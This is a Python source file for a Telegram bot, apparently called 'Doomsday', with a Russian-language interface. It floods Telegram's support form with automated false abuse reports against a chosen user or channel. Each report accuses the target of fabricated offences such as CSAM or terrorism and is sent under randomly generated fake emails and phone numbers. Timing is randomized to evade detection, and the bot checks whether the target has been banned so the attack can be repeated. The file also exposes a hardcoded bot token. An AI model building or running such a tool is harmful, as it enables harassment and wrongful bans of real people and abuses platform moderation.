import requests
import time
import random
import threading
import re

TOKEN = "8137527477:AAGjVNZA7XkNvE4azSIfRnkVstodlSt_1hM"
URL = f"https://api.telegram.org/bot{TOKEN}/"

waiting_for_username = {}
mass_report_active = {}
mass_report_target = {}
report_count_user = {}
report_count_channel = {}
stop_mass_report = {}

REPORT_TEXTS = [
    "CSAM and child exploitation material",
    "Terrorist propaganda and calls for violence",
    "Extremist content and hate speech",
    "Distribution of prohibited adult content",
    "Harassment and doxxing of minors"
]

# ========== ФУНКЦИЯ ПРОВЕРКИ СТАТУСА ==========
def check_target_status(target):
    try:
        if target.startswith("https://t.me/"):
            url = target
        elif target.startswith("@"):
            url = f"https://t.me/{target[1:]}"
        else:
            url = f"https://t.me/{target}"
            
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        response = requests.get(url, headers=headers, timeout=10, allow_redirects=True)
        
        if response.status_code == 404:
            return "dead"
        elif response.status_code == 200:
            text_lower = response.text.lower()
            if "this channel is private" in text_lower or "this group is private" in text_lower:
                return "private"
            elif "you don't have a telegram account yet" in text_lower:
                return "dead"
            elif "tgme_page_extra" in response.text or "tgme_page_title" in response.text:
                return "alive"
            else:
                return "alive"
    except:
        return "error"
    return "alive"

# ========== ОСНОВНЫЕ ФУНКЦИИ ==========
def get_updates(offset=None):
    url = URL + "getUpdates"
    params = {"timeout": 100, "offset": offset}
    try:
        response = requests.get(url, params=params, timeout=30)
        return response.json()
    except:
        return {"ok": False, "result": []}

def send_message(chat_id, text):
    url = URL + "sendMessage"
    params = {"chat_id": chat_id, "text": text}
    try:
        requests.get(url, params=params, timeout=10)
    except:
        pass

def send_report(target, is_channel=False):
    email = f"{random.choice(['user','anon','report','tg'])}{random.randint(1000,9999)}@gmail.com"
    phone = f"+92{random.randint(9392823620, 9994997058)}"
    violation = random.choice(REPORT_TEXTS)

    if is_channel:
        message_text = f"""URGENT REPORT - CHANNEL VIOLATION

Channel {target} is distributing {violation}.

Screenshots and evidence saved.

Case ID: tg-{random.randint(100000, 999999)}"""
    else:
        message_text = f"""URGENT REPORT - USER VIOLATION

User @{target} is distributing {violation}.

This user MUST be banned immediately.

Case ID: tg-{random.randint(100000, 999999)}"""

    headers = {
        "Host": "telegram.org",
        "user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://telegram.org",
        "referer": "https://telegram.org/support"
    }
    
    try:
        s = requests.Session()
        s.get("https://telegram.org/support", headers=headers, timeout=10)
        data = f"message={message_text}&email={email}&phone={phone}&setln="
        r = s.post("https://telegram.org/support", data=data, headers=headers, timeout=15)
        
        if "Thanks" in r.text or "success" in r.text.lower():
            return True
        return False
    except:
        return False

def extract_username(text):
    text = text.strip()
    if text.startswith("https://t.me/"):
        parts = text.split("/")
        username = parts[-1].split("?")[0]
        return username, True
    elif text.startswith("@"):
        return text[1:], False
    else:
        return text, False

def mass_report_worker(chat_id, target, count, is_channel):
    global report_count_user, report_count_channel, stop_mass_report
    
    if is_channel:
        sent = 0
        for i in range(count):
            if stop_mass_report.get(chat_id, False):
                send_message(chat_id, f"⏹️ Остановлено. Отправлено: {sent}")
                break
            success = send_report(target, is_channel=True)
            percent = int((i+1) / count * 100)
            if success:
                sent += 1
                report_count_channel[chat_id] = report_count_channel.get(chat_id, 0) + 1
                send_message(chat_id, f"💀 [{percent}%] Жалоба {i+1}/{count} на канал {target} | отправлено {sent}")
            else:
                send_message(chat_id, f"❌ [{percent}%] Ошибка: жалоба {i+1}/{count} на канал {target}")
            time.sleep(random.uniform(20, 90))
        send_message(chat_id, f"📊 Судный день завершён. Отправлено: {sent} жалоб на канал {target}")
    else:
        sent = 0
        for i in range(count):
            if stop_mass_report.get(chat_id, False):
                send_message(chat_id, f"⏹️ Остановлено. Отправлено: {sent}")
                break
            success = send_report(target, is_channel=False)
            percent = int((i+1) / count * 100)
            if success:
                sent += 1
                report_count_user[chat_id] = report_count_user.get(chat_id, 0) + 1
                send_message(chat_id, f"💀 [{percent}%] Жалоба {i+1}/{count} на @{target} | отправлено {sent}")
            else:
                send_message(chat_id, f"❌ [{percent}%] Ошибка: жалоба {i+1}/{count} на @{target}")
            time.sleep(random.uniform(20, 90))
        send_message(chat_id, f"📊 Судный день завершён. Отправлено: {sent} жалоб на @{target}")
    
    mass_report_active[chat_id] = False
    stop_mass_report[chat_id] = False

print("🔥 Бот «Судный день» запущен.")

last_id = 0
while True:
    try:
        updates = get_updates(last_id + 1)
        if updates.get("ok") and updates["result"]:
            for update in updates["result"]:
                last_id = update["update_id"]
                
                if "message" not in update or "text" not in update["message"]:
                    continue
                
                chat_id = update["message"]["chat"]["id"]
                text = update["message"]["text"].strip()
                
                if text in ["/help", "/start"]:
                    send_message(chat_id, "⚡ Команды:\n/report — одна жалоба\n/massreport — массовые 5-50\n/doomsday — СУДНЫЙ ДЕНЬ 10-100\n/check — проверить статус\n/status — статистика\n/stop — остановить")
                
                elif text == "/report":
                    waiting_for_username[chat_id] = "single"
                    send_message(chat_id, "📢 Введи @username или ссылку")
                
                elif text == "/massreport":
                    waiting_for_username[chat_id] = "mass"
                    send_message(chat_id, "📢 Введи цель\nЗатем количество (5-50)")
                
                elif text == "/doomsday":
                    waiting_for_username[chat_id] = "doomsday"
                    send_message(chat_id, "💀 СУДНЫЙ ДЕНЬ\nВведи цель (@username или ссылка)")
                
                elif text == "/check":
                    waiting_for_username[chat_id] = "check_target"
                    send_message(chat_id, "🔍 Введи цель для проверки")
                
                elif text == "/status":
                    user_count = report_count_user.get(chat_id, 0)
                    channel_count = report_count_channel.get(chat_id, 0)
                    send_message(chat_id, f"📊 Статистика:\n👤 Юзеров: {user_count}\n📢 Каналов: {channel_count}\nВсего: {user_count + channel_count}")
                
                elif text == "/stop":
                    if mass_report_active.get(chat_id, False):
                        stop_mass_report[chat_id] = True
                        send_message(chat_id, "⏹️ Останавливаю...")
                    else:
                        send_message(chat_id, "⚠️ Нет активной атаки")
                
                # --- ОБРАБОТКА ВВОДА ---
                elif waiting_for_username.get(chat_id) == "single":
                    username, is_channel = extract_username(text)
                    target_type = "канал" if is_channel else "юзера"
                    send_message(chat_id, f"⏳ Жалоба на {target_type} {username}...")
                    success = send_report(username, is_channel)
                    if success:
                        if is_channel:
                            report_count_channel[chat_id] = report_count_channel.get(chat_id, 0) + 1
                        else:
                            report_count_user[chat_id] = report_count_user.get(chat_id, 0) + 1
                        send_message(chat_id, f"✅ Жалоба на {target_type} {username} отправлена!")
                    else:
                        send_message(chat_id, f"❌ Ошибка на {target_type} {username}")
                    waiting_for_username[chat_id] = None
                
                elif waiting_for_username.get(chat_id) == "mass":
                    mass_report_target[chat_id] = text
                    waiting_for_username[chat_id] = "mass_count"
                    send_message(chat_id, "🔢 Введи количество (5-50)")
                
                elif waiting_for_username.get(chat_id) == "mass_count":
                    try:
                        count = int(text)
                        if 5 <= count <= 50:
                            if mass_report_active.get(chat_id, False):
                                send_message(chat_id, "⚠️ Атака уже идёт")
                            else:
                                target_raw = mass_report_target[chat_id]
                                username, is_channel = extract_username(target_raw)
                                target_type = "канал" if is_channel else "юзера"
                                mass_report_active[chat_id] = True
                                send_message(chat_id, f"🚀 {count} жалоб на {target_type} {username}")
                                thread = threading.Thread(target=mass_report_worker, args=(chat_id, username, count, is_channel))
                                thread.start()
                        else:
                            send_message(chat_id, "❌ От 5 до 50")
                    except:
                        send_message(chat_id, "❌ Введи число")
                    waiting_for_username[chat_id] = None
                
                elif waiting_for_username.get(chat_id) == "doomsday":
                    mass_report_target[chat_id] = text
                    waiting_for_username[chat_id] = "doomsday_count"
                    send_message(chat_id, "🔢 Введи количество (10-100)")
                
                elif waiting_for_username.get(chat_id) == "doomsday_count":
                    try:
                        count = int(text)
                        if 10 <= count <= 100:
                            if mass_report_active.get(chat_id, False):
                                send_message(chat_id, "⚠️ Атака уже идёт")
                            else:
                                target_raw = mass_report_target[chat_id]
                                username, is_channel = extract_username(target_raw)
                                target_type = "канал" if is_channel else "юзера"
                                mass_report_active[chat_id] = True
                                send_message(chat_id, f"💀💀💀 СУДНЫЙ ДЕНЬ 💀💀💀\n{count} жалоб на {target_type} {username}")
                                thread = threading.Thread(target=mass_report_worker, args=(chat_id, username, count, is_channel))
                                thread.start()
                        else:
                            send_message(chat_id, "❌ От 10 до 100")
                    except:
                        send_message(chat_id, "❌ Введи число")
                    waiting_for_username[chat_id] = None
                
                elif waiting_for_username.get(chat_id) == "check_target":
                    username, is_channel = extract_username(text)
                    status = check_target_status(username)
                    
                    if status == "dead":
                        msg = f"💀💀💀 СНЕСЕН НАХУЙ! 💀💀💀\n{username} полностью удалён или заблокирован."
                    elif status == "private":
                        msg = f"⚠️ ЦЕЛЬ СКРЫТА! {username} стал приватным. Нужно повторить атаку."
                    elif status == "alive":
                        msg = f"🟢 ЦЕЛЬ ЖИВА. {username} всё ещё доступен."
                    else:
                        msg = f"❌ Не удалось проверить {username}. Ошибка."
                    
                    send_message(chat_id, msg)
                    waiting_for_username[chat_id] = None
                
                elif text.startswith("/"):
                    continue
                else:
                    send_message(chat_id, "❓ /help")
        
        time.sleep(1)
    except Exception as e:
        print(f"Ошибка: {e}")
        time.sleep(5)
